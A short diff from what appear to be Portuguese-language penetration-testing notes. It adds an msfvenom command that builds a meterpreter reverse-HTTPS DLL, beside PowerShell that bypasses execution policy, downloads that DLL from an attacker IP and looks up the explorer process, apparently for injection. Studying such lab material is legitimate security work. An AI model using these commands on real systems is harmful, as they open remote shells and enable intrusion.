@@ -8,6 +8,7 @@ Para executar os comando necessários abrimos o powershell com -ep bypass para p
 ```powershell
 PowerShell -ep Bypass
 
+#feito com msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.196 LPORT=443 -f dll -o met.dll
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.196/met.dll')
 
 $procid = (Get-Process -Name explorer).Id
